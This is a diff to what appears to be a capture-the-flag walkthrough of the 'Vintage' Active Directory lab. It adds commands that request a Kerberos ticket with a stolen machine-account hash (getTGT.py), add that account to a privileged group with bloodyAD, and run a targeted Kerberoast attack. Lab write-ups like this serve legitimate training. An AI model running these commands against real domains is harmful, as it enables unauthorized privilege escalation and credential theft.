@@ -96,14 +96,22 @@
 
 13. First, we need to get a Ticket Granting Ticket as the GMSA01$ user using impacket's getTGT.py script and set the ticket as the KRB5CCNAME environment variable.
 
-``
+`getTGT.py -hashes $(cat user/gmsa01\$.ntlm_hash) 'vintage.htb/GMSA01$@dc01.vintage.htb'`
+
+`export KRB5CCNAME=GMSA01$@dc01.vintage.htb.ccache`
 
 <img width="741" height="205" alt="image" src="https://github.com/user-attachments/assets/f78e3e78-5f58-4fd4-a461-e860b9029907" />
 
 14. Now add our account to the Service Managers group using BloodyAD
 
-``
+`bloodyAD -k --dc-ip 10.129.231.205 --host dc01.vintage.htb -u 'GMSA01$' -d vintage.htb add groupMember SERVICEMANAGERS 'GMSA01$'`
 
 <img width="911" height="57" alt="image" src="https://github.com/user-attachments/assets/d21b1df3-cabb-471b-83ca-5947aa03dd86" />
 
-15. 
+15. We now conduct the targetedKerberoast attack 
+
+`targetedKerberoast.py -d vintage.htb -u 'GMSA01$' -k --dc-host dc01.vintage.htb`
+
+
+
+16. 
